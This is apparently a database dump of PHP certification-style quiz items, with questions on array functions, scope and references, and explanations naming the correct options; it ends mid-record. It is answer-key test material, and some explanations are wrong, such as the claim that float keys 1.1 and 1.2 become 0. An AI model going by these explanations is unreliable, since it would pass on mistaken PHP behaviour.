	(50,2,'You have got the following array after ap.....plish the task?','','<p><span>You have got the following array after applying some sorting operation:</span></p>\r\n<p><span><pre><?php\r\nArray\r\n(\r\n    [0] => book1.pdf\r\n     [1] => book11.pdf\r\n     [2] => book12.pdf\r\n    [3] => book2.pdf\r\n) \r\n?></pre></span></p>\r\n<p><span><span>However, you wanted to sort the array in the following format:</span></span></p>\r\n<p><span><span><pre><?php\r\nArray\r\n(\r\n              [3] => book1.pdf\r\n              [2] => book2.pdf\r\n              [1] => book11.pdf\r\n              [0] => book12.pdf\r\n)\r\n?>\r\n</pre></span></span></p>\r\n<p><span><span><span>Which of the following array sorting functions should you use to accomplish the task?</span></span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The natsort() function is a sorting function. It uses a natural ordering algorithm to sort the contents of an array instead of using a simple binary comparison between the contents of each element. This function is mostly used to sort alphanumeric string. For example, if we have an array (\"book12.pdf\", \"book11.pdf\", \"book2.pdf\", \"book1.pdf\"), the standard sorting algorithm will give the following output:</span></p>\r\n<p><span><pre><?php\r\nArray\r\n(\r\n          [0] => book1.pdf\r\n          [1] => book11.pdf\r\n          [2] => book12.pdf\r\n          [3] => book2.pdf\r\n) \r\n?></pre></span></p>\r\n<p><span><span>However, natural order sorting using the natsort() function will give the following output:</span></span></p>\r\n<p><span><span><pre><?php\r\nArray\r\n(\r\n          [3] => book1.pdf\r\n          [2] => book2.pdf\r\n          [1] => book11.pdf\r\n          [0] => book12.pdf\r\n) \r\n?></pre></span></span></p>\r\n<p><span><span><span>Answer option B is incorrect. The ksort() function accepts an associative array and sorts its keys either alphabetically if any strings are present, or numerically if all elements are numbers. However, it does not sort the elements of the associative array.</span><br /><br /><span>Answer option C is incorrect. The sort() function is used to sort a given array either alphabetically if any strings are present or numerically if all elements are numbers. However, a user cannot pass an associative array to the sort() function. The reason behind this is that the values of the array are sorted as expected but keys are replaced by numerical indices that follow the sort order.</span><br /><br /><span>Answer option D is incorrect. The asort() function accepts an associative array and sorts its values either alphabetically if any strings are present or numerically if all elements are numbers. However, the asort() function preserves the array keys.</span></span></span></p>',0,'2012-11-18 22:31:06','2012-11-18 22:31:06'),
	(51,2,'Consider the following PHP script:.....Mul();\r\nprint($b);\r\n?> ','','<p><span>Consider the following PHP script:</span></p>\r\n<p><span><pre><?php\r\n$a = 5;\r\n$b = 10;\r\n \r\nfunction Mul()\r\n{\r\n$a =0;\r\n    $b = $a * $b;\r\n}\r\n \r\nMul();\r\nprint($b);\r\n?> </pre></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option B is correct.</span><br /><br /><span>In the above script, the values of $a and $b outside of the function Mul() will not affect the values inside the function and the values of $a and $b in the function Mul() will not affect the values outside the function scope. Hence, the script will print the value 10 that is assigned to $b in the third line of the script.</span></p>\r\n<p><span><span>Variable scope describes where in a program\'s text the variable may be used, while the extent (or lifetime) describes when in a program\'s execution a variable has a value. PHP has three types of variable scopes:</span><br /><br /></span></p>\r\n<ol>\r\n<li><uc:hed>Function Scope:&nbsp;</uc:hed>Variable scope exists within the function where the variable was defined.</li>\r\n<li><uc:hed>Global Scope:&nbsp;</uc:hed>Variable scope exists everywhere in the PHP script.</li>\r\n<li><uc:hed>Class Scope:&nbsp;</uc:hed>Variable scope exists within a class where the variable was defined.</li>\r\n</ol>\r\n<div><span>Answer options A, C, and D are incorrect. These are not valid answer options.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://www.php.net/manual/en/language.variables.scope.php\" tabindex=\"-1\">php.net/manual/en/language.variables.scope.php</a></uc:ref></div>\r\n<p><span><br /></span></p>',0,'2012-11-18 22:32:14','2012-11-18 22:32:14'),
	(52,2,'Consider the following PHP script:.....lue \'Web development\'?','','<p><span>Consider the following PHP script:</span></p>\r\n<p><span><pre><?php\r\n$a = array(\r\n  1 => \'php\',\r\n  \'Hypertext\',\r\n  \'Preprocessor\',\r\n  \'widely used\' => array(\r\n    \'general\' => \'purpose\',\r\n    \'scripting\' => \'language\',\r\n    \'that\' => \'was\',\r\n    \'originally\' => array(\r\n      5 => \'designed\',\r\n      9 => \'for\',\r\n      \'Web development\',\r\n      4 => \'purpose\',)));\r\n \r\n//write code here  \r\n \r\n?> </pre></span></p>\r\n<p><span><span>What should you write here to print the value \'Web development\'?</span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>For printing the value, you will have to print the</span></p>\r\n<p><span><span class=\"pln\">$a</span><span class=\"pun\">[</span><span class=\"str\">\'widely used\'</span><span class=\"pun\">][</span><span class=\"str\">\'originally\'</span><span class=\"pun\">][</span><span class=\"lit\">10</span><span class=\"pun\">]</span></span></p>\r\n<p><span>In the associative array, the array index increments from the last integer index key. The index key of the value \'Web development\' will be 10 since the last integer index key is 9. An associative array is an abstract data type composed of a collection of unique keys and a collection of values, where each key is associated with one value (or set of values). The operation of finding the value associated with a key is called a lookup or indexing, and this is the most important operation supported by an associative array. The relationship between a key and its value is sometimes called a mapping or binding. The following code creates an associative array with product names as keys and prices as values.</span><br /><br /><uc:stx>$prices = array( \'Tires\'=&gt;100,&nbsp;<br />\'Oil\'=&gt;10, \'Spark Plugs\'=&gt;4 );&nbsp;</uc:stx><span></span><uc:iref source=\"wiki\"><br /><br /><uc:note>Note:</uc:note>&nbsp;Always use quotes around a string literal array index. For example, $foo[\'bar\'] is correct, while $foo[bar] is not.<br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://php.net/manual/en/language.types.array.php\" tabindex=\"-1\">http://php.net/manual/en/language.types.array.php</a></uc:ref></uc:iref></p>',0,'2012-11-18 22:33:38','2012-11-18 22:33:38'),
	(53,2,'You have been given the following PHP cod.....at will be the output?','','<p><span>You have been given the following PHP code snippet:</span></p>\r\n<p><span><pre><?php\r\n$array = array (\'1\', \'2\', \'3\');\r\nforeach ($array as $key => $value) {\r\n      $value = 4;\r\n}\r\nprint_r($array);\r\n?></pre></span></p>\r\n<p><span><span>What will be the output?</span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The foreach statement will operate on the copy of $array. Hence, there will be no change in its original value. The foreach loop is used to iterate over the entire array from start to finish. There are two forms of the foreach loop, which are as follows:</span></p>\r\n<p><span><pre><?php\r\nforeach (array_expression as $value)\r\n    Statement\r\n//or\r\nforeach (array_expression as $key => $value)\r\n    Statement\r\n?></pre></span></p>\r\n<p><span><span>In the first form, foreach loop iterates over the array that is given by array_expression. On each iteration, the value of the current element is assigned to $value and the internal array pointer increases by one.</span><br /><br /><span>In the second form of the foreach loop, on each iteration, the value of the current element is assigned to $value. Also, the current element\'s key will be assigned to the variable $key on each iteration and the internal array pointer increases by one.</span></span></p>',0,'2012-11-18 22:35:18','2012-11-18 22:35:18'),
	(54,2,'What will be the output of the following .....Choose all that apply.','','<p><span>What will be the output of the following code snippet?</span></p>\r\n<p><span><pre><?php\r\n$my_array = array(1 => \'a\', 2 => \'b\');\r\nprint_r($my_aray);\r\n?> </pre></span></p>\r\n<p><span><span>Each correct answer represents a complete solution. Choose all that apply.</span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer options C and D are correct.</span><br /><br /><span>In this question, you have been given an array named my_array, however, you are printing my_aray. Hence, the print_r() statement will output NULL. However, it may also print an error message according to your PHP.ini setting.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://in2.php.net/manual/en/function.print-r.php\" tabindex=\"-1\">http://in2.php.net/manual/en/function.print-r.php</a></uc:ref></p>',0,'2012-11-18 22:36:18','2012-11-18 22:36:18'),
	(55,2,'What will be the output of the following .....>\r\n','','<p><span>What will be the output of the following PHP code snippet?</span></p>\r\n<p><span><pre><?php\r\n$array = array (1.1 => \'1\', 1.2 => \'1\');\r\necho count ($array);\r\n?> </pre></span></p>\r\n<p><span><br /></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>In the associative arrays, only integer numbers and strings can be used as keys of an array. If you use a floating-point number, it will be converted into an integer. In the given question, the index keys 1.1 and 1.2 will be converted to the integer number 0. Due to this, $array will only contain a single element, i.e., 0 =&gt; \'1\'.</span></p>',0,'2012-11-18 22:37:16','2012-11-18 22:37:16'),
	(56,2,'Consider the following PHP script:..... output of the script?','','<p><span>Consider the following PHP script:</span></p>\r\n<p><span><pre><?php\r\n$base_array = array(\"red\", \"green\", \"yellow\", \"white\");\r\n$replacements_array = array(0 => \"orange\", 4 => \"blue\");\r\n \r\n$result = array_replace($base_array, $replacements_array);\r\nprint_r($result);\r\n?></pre></span></p>\r\n<p><span><span>What will be the output of the script?</span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The array_replace() function is used to replace elements from passed arrays into one array. While using the array_replace() function, if an array contains a key that is already present in another array, the value of the key gets replaced from the value in the second array. If the key is present only in the second array and not in the first one, it gets added to the first array with the same value in the second array. If the key is present only in the first array, there is no change.</span><br /><br /><span>The only actual difference between \'+\' and array_replace is in terms of performance, where \'+\' may be preferable because when it finds duplicates it doesn\'t replace the value; it just moves on. Also, it doesn\'t entail a (relatively expensive) function call.</span><br /><br /><span>Hence the output will be as follows:</span></p>\r\n<p><span><pre><?php\r\nArray\r\n(\r\n[0] => orange\r\n[1] => green\r\n[2] => yellow\r\n[3] => white\r\n[4] => blue\r\n)\r\n?></pre></span></p>\r\n<p><span><span>Answer options B, C, and D are incorrect. These are not valid options according to the script.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://in3.php.net/manual/en/function.array-replace.php\" tabindex=\"-1\">http://in3.php.net/manual/en/function.array-replace.php</a></uc:ref></span></p>',0,'2012-11-18 22:38:53','2012-11-18 22:38:53'),
	(57,2,'Which of the following methods is used to.....ties when accessed as a list?','','<p><span>Which of the following methods is used to retain properties when accessed as a list?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>ArrayObject::STD_PROP_LIST is used to retain properties when accessed as a list. For example:</span></p>\r\n<p><span><pre><?php                                                     \r\n$a = new ArrayObject(array(), ArrayObject::STD_PROP_LIST);\r\n    $a[\'arr\'] = \'array data\';                             \r\n    $a->prop = \'prop data\';                               \r\n$b = new ArrayObject();                                   \r\n    $b[\'arr\'] = \'array data\';                             \r\n    $b->prop = \'prop data\';                               \r\n \r\nprint_r($a);\r\n                                                          \r\n/*ArrayObject Object                                     \r\n(                                                      \r\n      [prop] => prop data                               \r\n)*/                                                     \r\n                                              \r\nprint_r($b);                                              \r\n                                                          \r\n/*ArrayObject Object                                     \r\n(                                                      \r\n      [arr] => array data                               \r\n)*/                                                      \r\n?></pre></span></p>\r\n<p><span><span>Answer options B, C, and D are incorrect. These are not valid options.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://in3.php.net/manual/en/class.arrayobject.php\" tabindex=\"-1\">http://in3.php.net/manual/en/class.arrayobject.php</a></uc:ref></span></p>',0,'2012-11-18 22:40:05','2012-11-18 22:40:05'),
	(58,2,'Which of the following functions will you.....ect by preserving key values?','','<p><span>Which of the following functions will you use to sort the values of an array object by preserving key values?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option B is correct.</span><br /><br /><span>The ArrayObject::asort method is used to sort the values of an array object. For example:</span></p>\r\n<p><span><pre><?php\r\n$ArrayObject = new ArrayObject($fruits);\r\n$ArrayObject->asort();\r\n?></pre></span></p>\r\n<p><span><span>Answer options A, C, and D are incorrect. ArrayObject::keysort is used to sort by keys. ArrayObject::sort and ArrayObject::rsort do not preserve key values.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://php.net/manual/en/arrayobject.asort.php\" tabindex=\"-1\">http://php.net/manual/en/arrayobject.asort.php</a></uc:ref></span></p>',0,'2012-11-18 22:41:14','2012-11-18 22:41:14'),
	(59,2,'Consider the following PHP script:..... output of the script?','','<p><span>Consider the following PHP script:</span></p>\r\n<p><span><pre><?php\r\n    $var1 = array(\"foo\", \"bar\", \"hello\", \"world\", \"PHP\", \"nice\");\r\n    $var2 = array(\"foo\", \"bar\", \"hello\", \"PHP\", \"nice\", \"language\");\r\n    echo count( array_merge(array_diff($var1,$var2),array_diff($var2,$var1)));\r\n?></pre></span></p>\r\n<p><span><span>What will be the output of the script?</span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option B is correct.</span><br /><br /><span>The array_diff() function is used to calculate the difference between two arrays. Here, when array_diff($var1,$var2) will be called, output will be \"world\". The output of the array_diff($var2, $var1) will be \"language\". So when the array_merge function merges these two outputs, the new array contains two elements \"world\", \"language\" respectively.</span><br /><br /><span>Answer options A, C, and D are incorrect. These are not valid output of the given script.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://php.net/manual/en/language.types.array.php\" tabindex=\"-1\">http://php.net/manual/en/language.types.array.php</a></uc:ref></p>',0,'2012-11-18 22:42:08','2012-11-18 22:42:08'),
	(60,2,'Consider the following code:\r\n.....at will be the output?','','<p><span>Consider the following code:</span></p>\r\n<p><span><pre><?php\r\n$array = array(\"a1\"=>x,\"a2\"=>e,\"a3\"=>z);\r\nasort( $array );\r\n \r\nforeach ( $array as $keys => $values ) {\r\nprint \"$keys = $values \";\r\n}\r\n?> </pre></span></p>\r\n<p><span><span>What will be the output?</span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The asort() function accepts an associative array and sorts its values either alphabetically if any strings are present or numerically if all elements are numbers. However, the asort() function preserves the array keys. Consider the following example:</span></p>\r\n<p><span><pre><?php\r\n    $array = array(\"a1\"=>\'x\',\"a2\"=>\'e\',\"a3\"=>\'z\');\r\n    asort( $array );\r\n    foreach ( $array as $keys => $values )\r\n    {\r\n         print \"$keys = $values<br />\";\r\n    }\r\n?> </pre></span></p>\r\n<p><span>Output:</span></p>\r\n<pre>a2 = e<br />a1 = x<br />a3 = z</pre>\r\n<pre></pre>\r\n<pre><span>In the output, the array keys are preserved and array elements are sorted in the same way as in the sort() function.</span></pre>\r\n<p><span><br /></span></p>',0,'2012-11-18 22:43:50','2012-11-18 22:43:50'),
	(61,2,'You run the following code:\r\n','','<p><span>You run the following code:</span></p>\r\n<p><span><pre><?php\r\n$array = array(\"a1\"=>x,\"a2\"=>e,\"a3\"=>z);\r\nksort( $array );\r\n \r\nforeach ( $array as $keys => $values ) {\r\n  print \"$keys = $values \";\r\n}\r\n?> </pre></span></p>\r\n<p><span><span>What will be the output?</span></span></p>','<p><span>The ksort() function accepts an associative array and sorts its keys either alphabetically if any strings are present, or numerically if all elements are numbers. However, it does not sort the elements of the associative array. Consider the PHP script given in the question:</span></p>\r\n<p><span><pre><?php\r\n$array = array(\"a1\"=>x,\"a2\"=>e,\"a3\"=>z);\r\nksort( $array );\r\n \r\nforeach ( $array as $keys => $values ) {\r\n  print \"$keys = $values \";\r\n}\r\n?> </pre></span></p>\r\n<p><span><uc:hed>Output:&nbsp;</uc:hed><span>Since the ksort() function only sorts the keys of the array not its elements and the keys of the given array are already sorted, the output array will be the same as input array. Hence, the output will be as follows:</span><br /><br /><uc:hed>a1 = x a2 = e a3 = z</uc:hed><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://in2.php.net/manual/en/function.ksort.php\" tabindex=\"-1\">http://in2.php.net/manual/en/function.ksort.php</a></uc:ref></span></p>',0,'2012-11-18 22:45:34','2012-11-18 22:45:34'),
	(62,2,'You passed an associative array to the so.....) function. What will happen?','','<p><span>You passed an associative array to the sort() function. What will happen?</span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option C is correct.</span><br /><br /><span>The elements of the array will be sorted and keys will not be preserved. The sort() function is used to sort a given array either alphabetically if any strings are present or numerically if all elements are numbers. However, a user cannot pass an associative array to the sort() function. The reason behind this is that the values of the array are sorted as expected but keys are replaced by numerical indices that follow the sort order. Consider the following example:</span></p>\r\n<p><span><pre><?php\r\n$array = array(\"a1\"=>x,\"a2\"=>e,\"a3\"=>z);\r\nsort( $array );\r\n \r\nforeach ( $array as $keys => $values ) {\r\nprint \"$keys = $values \";\r\n}\r\n?> </pre></span></p>\r\n<p><span><uc:hed>Output:&nbsp;</uc:hed><span>Here, the array keys will be lost, however, the elements will be sorted. Hence, the output will be as follows:</span></span></p>\r\n<p><span><span><span class=\"lit\">0</span><span class=\"pln\"> </span><span class=\"pun\">=</span><span class=\"pln\"> e </span><span class=\"lit\">1</span><span class=\"pln\"> </span><span class=\"pun\">=</span><span class=\"pln\">x </span><span class=\"lit\">2</span><span class=\"pln\"> </span><span class=\"pun\">=</span><span class=\"pln\"> z</span></span></span></p>\r\n<div class=\"clearfix\"><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://in2.php.net/manual/en/function.sort.php\" tabindex=\"-1\">http://in2.php.net/manual/en/function.sort.php</a></uc:ref></div>\r\n<p><span><span><span class=\"pln\"><br /></span></span></span></p>',0,'2012-11-18 22:46:58','2012-11-18 22:46:58'),
	(63,2,'You run the following script:\r.....at will be the output?','','<p><span>You run the following script:</span></p>\r\n<p><span><pre><?php\r\n \r\n$array1 = array (\"a\", \"b\", \"c\", \"d\", \"e\", \"f\");\r\n$array2 = array_slice($array1, 2, 2);\r\n \r\nforeach ( $array2 as $val ) {\r\n    print \"$val \";\r\n}\r\n?> </pre></span></p>\r\n<p><span><span>What will be the output?</span></span></p>','<p><span><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>This script prints the elements \'c\', and \'d\'. The array_slice() function is used to extract a chunk of an array. The syntax of the array_slice() function is as follows:</span></span></p>\r\n<p><span><span class=\"pln\"> array array_slice </span><span class=\"pun\">(</span><span class=\"pln\"> array $array </span><span class=\"pun\">,</span><span class=\"pln\"> </span><span class=\"kwd\">int</span><span class=\"pln\"> $offset </span><span class=\"pun\">[,</span><span class=\"pln\"> </span><span class=\"kwd\">int</span><span class=\"pln\"> $length </span><span class=\"pun\">[,</span><span class=\"pln\"> </span><span class=\"kwd\">bool</span><span class=\"pln\"> $preserve_keys </span><span class=\"pun\">=</span><span class=\"pln\"> </span><span class=\"kwd\">false</span><span class=\"pln\"> </span><span class=\"pun\">]]</span><span class=\"pln\"> </span><span class=\"pun\">)</span></span></p>\r\n<p><span>where,</span><br /><br /></p>\r\n<table>\r\n<tbody>\r\n<tr><th>Option</th><th>Description</th></tr>\r\n<tr>\r\n<td>array</td>\r\n<td>It is the input array.</td>\r\n</tr>\r\n<tr>\r\n<td>offset</td>\r\n<td>If offset is positive, the sequence starts from that offset in the array. If offset is negative, the sequence starts from the end of the array.</td>\r\n</tr>\r\n<tr>\r\n<td>length</td>\r\n<td>If the length is omitted, array_slice() assumes that the user wants all elements from the starting position onward returned.</td>\r\n</tr>\r\n<tr>\r\n<td>preserve_keys</td>\r\n<td>When this option is used, array_slice() preserves the keys and does not reorder them.</td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n<p><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://in2.php.net/manual/en/function.array-slice.php\" tabindex=\"-1\">http://in2.php.net/manual/en/function.array-slice.php</a></uc:ref></p>',0,'2012-11-18 22:48:15','2012-11-18 22:48:15'),
	(64,2,'You run the following PHP script:','','<p><span>You run the following PHP script:</span></p>\r\n<p><span><pre><?php\r\n$array1 = array (\"a\", \"b\", \"c\", \"d\", \"e\", \"f\");\r\n$array2 = array_slice($array1, -3);\r\n \r\nforeach ( $array2 as $val ) {\r\n    print \"$val \";\r\n}\r\n?></pre></span></p>\r\n<p><span><span>What will be the output?</span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>In the above script, the offset argument is negative and the length argument is zero. Due to the negative offset argument, it will slice the array from the 3rd last element from the end. Besides this, since the length argument of the array_slice() function is 0, it will slice up to the end of the array.</span><br /><br /><span>The array_slice() function is used to extract a chunk of an array. The syntax of the array_slice() function is as follows:</span></p>\r\n<p><span><span class=\"pln\"> array array_slice </span><span class=\"pun\">(</span><span class=\"pln\"> array $array </span><span class=\"pun\">,</span><span class=\"pln\"> </span><span class=\"kwd\">int</span><span class=\"pln\"> $offset </span><span class=\"pun\">[,</span><span class=\"pln\"> </span><span class=\"kwd\">int</span><span class=\"pln\"> $length </span><span class=\"pun\">[,</span><span class=\"pln\"> </span><span class=\"kwd\">bool</span><span class=\"pln\"> $preserve_keys </span><span class=\"pun\">=</span><span class=\"pln\"> </span><span class=\"kwd\">false</span><span class=\"pln\"> </span><span class=\"pun\">]]</span><span class=\"pln\"> </span><span class=\"pun\">)</span></span></p>\r\n<p><span><span class=\"pun\">where,</span></span></p>\r\n<p><span><span class=\"pun\"><br class=\"Apple-interchange-newline\" /></span></span></p>\r\n<table>\r\n<tbody>\r\n<tr><th>Option</th><th>Description</th></tr>\r\n<tr>\r\n<td>array</td>\r\n<td>It is the input array.</td>\r\n</tr>\r\n<tr>\r\n<td>offset</td>\r\n<td>If offset is positive, the sequence starts from that offset in the array. If offset is negative, the sequence starts from the end of the array.</td>\r\n</tr>\r\n<tr>\r\n<td>length</td>\r\n<td>If the length is omitted, array_slice() assumes that the user wants all elements from the starting position onward returned.</td>\r\n</tr>\r\n<tr>\r\n<td>preserve_keys</td>\r\n<td>When this option is used, array_slice() preserves the keys and does not reorder them.</td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n<p><span><span class=\"pun\"><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://in2.php.net/manual/en/function.array-slice.php\" tabindex=\"-1\">http://in2.php.net/manual/en/function.array-slice.php</a></uc:ref><br /></span></span></p>',0,'2012-11-18 22:49:45','2012-11-18 22:49:45'),
	(65,2,'You run the following PHP script:','','<p><span>You run the following PHP script:</span></p>\r\n<p><span><pre><?php\r\n$array1 = array (\'a\' => 20, 30, 35);\r\n$array2 = array (\'b\' => 20, 35, 30);\r\n$array = array_intersect_assoc ($array1, $array2);\r\nvar_dump ($array);\r\n?> </pre></span></p>\r\n<p><span><span>What will be the output?</span></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The array_intersect_assoc() function checks whether the index keys as well as their respective key values between/among the given arrays are the same or not. For example, a PHP script is given as follows:</span></p>\r\n<p><span><pre><?php\r\n    $array1 = array (\'a\' => 20, 30, 35);\r\n    $array2 = array (\'b\' => 20, 35, 30);\r\n    $array = array_intersect_assoc ($array1, $array2);\r\n    var_dump ($array);\r\n?> </pre></span></p>\r\n<p><span><br /><span>However, all values in $array1 and $array2 are the same and their respective index keys are not the same. Hence, the output of the above script will be</span></span></p>\r\n<p><span><span><span class=\"pln\">array</span><span class=\"pun\">(</span><span class=\"lit\">0</span><span class=\"pun\">)</span><span class=\"pln\"> </span><span class=\"pun\">{</span><span class=\"pln\"> </span><span class=\"pun\">}</span></span></span></p>\r\n<p><span><span><span class=\"pun\"><span>which means that there will be no element in $array since the index keys of $array1 are not equal to the index keys of $array2.</span><br /><br /><span>Here is another example:</span></span></span></span></p>\r\n<p><span><span><span class=\"pun\"><span><pre> <?php\r\n    $array1 = array (\'a\' => 20, 30, 35);\r\n    $array2 = array (\'a\' => 20, 35, 30);\r\n    $array = array_intersect_assoc ($array1, $array2);\r\n    var_dump ($array);\r\n?> </pre></span></span></span></span></p>\r\n<p><span><span><span class=\"pun\"><span><span>The output of the above script will be:</span></span></span></span></span></p>\r\n<p><span><span><span class=\"pun\"><span><span><span class=\"pun\">{</span><span class=\"pln\"> </span><span class=\"pun\">[</span><span class=\"str\">\"a\"</span><span class=\"pun\">]=&gt;</span><span class=\"pln\"> </span><span class=\"kwd\">int</span><span class=\"pun\">(</span><span class=\"lit\">20</span><span class=\"pun\">)</span><span class=\"pln\"> </span><span class=\"pun\">}</span></span></span></span></span></span></p>\r\n<p><span><span><span class=\"pun\"><span><span><span class=\"pun\"><br /></span></span></span></span></span></span></p>\r\n<p><span><span><span class=\"pun\"><span><span><span class=\"pun\"><span>since there is one index key and its respective value (\'a\' =&gt; 20) is the same in both arrays, i.e., $array1 and $array2.&nbsp;</span><br /><br /><span>Answer option B is incorrect. You can retrieve this output when you are using the array_intersect() function instead of the array_intersect_assoc() function. The array_intersect() function extracts all the elements that are common for two or more arrays. Since this function only checks whether the values are the same, the index keys of arrays are ignored. For example, a user runs the following script:</span></span></span></span></span></span></span></p>\r\n<p><span><span><span class=\"pun\"><span><span><span class=\"pun\"><span><pre><?php\r\n    $array1 = array (\'a\' => 20, 30, 35);\r\n    $array2 = array (\'b\' => 20, 35, 30);\r\n    $array = array_intersect($array1, $array2);\r\n    var_dump ($array);\r\n?> </pre></span></span></span></span></span></span></span></p>\r\n<p><span><span><span class=\"pun\"><span><span><span class=\"pun\"><span><br /></span></span></span></span></span></span></span></p>\r\n<p><span><span><span class=\"pun\"><span><span><span class=\"pun\"><span><span>The output of the above script will be:</span></span></span></span></span></span></span></span></p>\r\n<p><span><span><span class=\"pun\"><span><span><span class=\"pun\"><span><span><span class=\"pln\">array</span><span class=\"pun\">(</span><span class=\"lit\">3</span><span class=\"pun\">)</span><span class=\"pln\"> </span><span class=\"pun\">{</span><span class=\"pln\"> </span><span class=\"pun\">[</span><span class=\"str\">\"a\"</span><span class=\"pun\">]=&gt;</span><span class=\"pln\"> </span><span class=\"kwd\">int</span><span class=\"pun\">(</span><span class=\"lit\">20</span><span class=\"pun\">)</span><span class=\"pln\"> </span><span class=\"pun\">[</span><span class=\"lit\">0</span><span class=\"pun\">]=&gt;</span><span class=\"pln\"> </span><span class=\"kwd\">int</span><span class=\"pun\">(</span><span class=\"lit\">30</span><span class=\"pun\">)</span><span class=\"pln\"> </span><span class=\"pun\">[</span><span class=\"lit\">1</span><span class=\"pun\">]=&gt;</span><span class=\"pln\"> </span><span class=\"kwd\">int</span><span class=\"pun\">(</span><span class=\"lit\">35</span><span class=\"pun\">)</span><span class=\"pln\"> </span><span class=\"pun\">}</span></span></span></span></span></span></span></span></span></p>\r\n<p><span><span><span class=\"pun\"><span><span><span class=\"pun\"><span><span><span class=\"pun\"><br /></span></span></span></span></span></span></span></span></span></p>\r\n<p><span><span><span class=\"pun\"><span><span><span class=\"pun\"><span><span><span class=\"pun\"><br /><span>since three elements (20, 30, 35) are common in both arrays, i.e., $array1 and $array2.&nbsp;</span><br /><br /><span>Answer options C and D are incorrect. These are invalid outputs.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://in2.php.net/manual/en/function.array-intersect-assoc.php\" tabindex=\"-1\">http://in2.php.net/manual/en/function.array-intersect-assoc.php</a></uc:ref></span></span></span></span></span></span></span></span></span></p>',0,'2012-11-18 22:52:16','2012-11-18 22:52:16'),
	(66,2,'What will be the output of the following .....ay_unique($input));\r\n?>','','<p><span>What will be the output of the following code snippet?</span></p>\r\n<p><span><pre><?php\r\n$input = array(4, \"4\", \"3\", 4, 3, \"3\", 3, 3, 3, 3, 3, 5, 5, 5, 5, 7, 7, 7, 7);\r\necho count(array_unique($input));\r\n?></pre></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>The array_unique() function is used to retrieve the unique contents from an array. The syntax of the array_unique() function is as follows:</span></p>\r\n<p><span><span class=\"pln\">array array_unique </span><span class=\"pun\">(</span><span class=\"pln\">array $array </span><span class=\"pun\">[,</span><span class=\"pln\"> </span><span class=\"kwd\">int</span><span class=\"pln\"> $sort_flags </span><span class=\"pun\">=</span><span class=\"pln\"> SORT_STRING </span><span class=\"pun\">])</span></span></p>\r\n<p><span><span class=\"pun\"><br /></span></span></p>\r\n<p><span><span class=\"pun\"><span>The sort flags are as follows:</span><br /><br /><span>Sorting type flags:</span><br /></span></span></p>\r\n<ul>\r\n<li><b><tt>SORT_REGULAR</tt></b>&nbsp;- It compares items normally (do not change types).</li>\r\n<li><b><tt>SORT_NUMERIC</tt></b>&nbsp;It compares items numerically.</li>\r\n<li><b><tt>SORT_STRING</tt></b>&nbsp;It compares items as strings.</li>\r\n<li><b><tt>SORT_LOCALE_STRING</tt></b>&nbsp;It compares items as strings, based on the current locale.</li>\r\n</ul>\r\n<p><span><span class=\"pun\"><span>Hence, the number of unique elements in the array given in the question will be 4.</span><br /><br /><uc:ref>Reference:&nbsp;<a target=\"_blank\" href=\"http://in2.php.net/manual/en/function.array-unique.php\" tabindex=\"-1\">http://in2.php.net/manual/en/function.array-unique.php</a></uc:ref><br /></span></span></p>',0,'2012-11-18 22:53:13','2012-11-18 22:53:13'),
	(67,2,'What will be the output of the following .....>\r\n','','<p><span>What will be the output of the following code?</span></p>\r\n<p><span><pre><?php\r\nfunction a(&$a = 19)\r\n{\r\n $a .= 1;\r\n}\r\n$b = 6;\r\na($b);\r\necho $b++;\r\n?></pre></span></p>\r\n<p><span><br /></span></p>','<p><b>Explanation:</b><span>&nbsp;Answer option A is correct.</span><br /><br /><span>Here, in the function a(), we are passing the address of $a not the value of $a. Hence, the output will be 61 instead of 6, which should be the output when we are passing the value of $a.</span></p>\r\n<p><span><br /></span></p>\r\n<p><span><span>A function is a set of actions defined by a user, which affects one or more objects as per the definition. The function block starts with the function keyword. Functions, once created, can be reused in other parts of the document. The syntax for defining a function is as follows:</span></span></p>\r\n<p><span><span><pre><?php\r\nfunction functionname()\r\n{\r\n   //Statements\r\n}\r\n?></pre></span></span></p>\r\n<p><span><span><uc:hed>Note:</uc:hed><span>&nbsp;Function name can be start only by letters and underscore( _ ), not with a number.</span></span></span></p>\r\n<p><span><span><span><br /></span></span></span></p>\r\n<p><span><span><span><span>Reference:&nbsp;</span><a target=\"_blank\" href=\"http://in2.php.net/manual/en/language.functions.php\" 